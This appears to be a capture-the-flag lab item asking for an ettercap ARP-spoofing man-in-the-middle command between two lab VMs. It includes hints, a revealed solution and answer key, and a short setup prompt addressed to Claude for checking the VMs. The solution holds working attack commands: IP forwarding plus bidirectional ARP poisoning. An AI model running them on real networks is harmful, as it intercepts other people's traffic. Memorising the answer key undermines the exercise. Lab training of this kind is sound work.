# Q128 — Ettercap ARP MITM

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` (Metasploitable 2); `192.168.52.130` (Windows 7) |
| **Domain** | 07 — Sniffing / 14 — Wireless |
| **Difficulty** | 🟡 Medium |
| **Tools** | `tcpdump`, `wireshark`, `ettercap`, `bettercap`, `aircrack-ng` |
| **Time budget** | 10–20 min |

---

## 📝 Question

Use ettercap to ARP-spoof between Parrot and Metasploitable+Win7. Provide command.

---

## 🎯 Flag Format

```
cmd=<short>
```

Example: `cmd=sudo ettercap -T -M arp:remote /192.168.52.129// /192.168.52.130//`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`-T` text mode; `-M arp:remote`.
</details>

<details>
<summary>Hint 2</summary>

Enable IP forwarding first.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo ettercap -T -M arp:remote /192.168.52.129// /192.168.52.130//
```

Poisons ARP tables both sides.

**Answer:** `cmd=sudo ettercap -T -M arp:remote /192.168.52.129// /192.168.52.130//`

📖 Ref: [tools/ettercap.md](../../tools/ettercap.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q128".
```
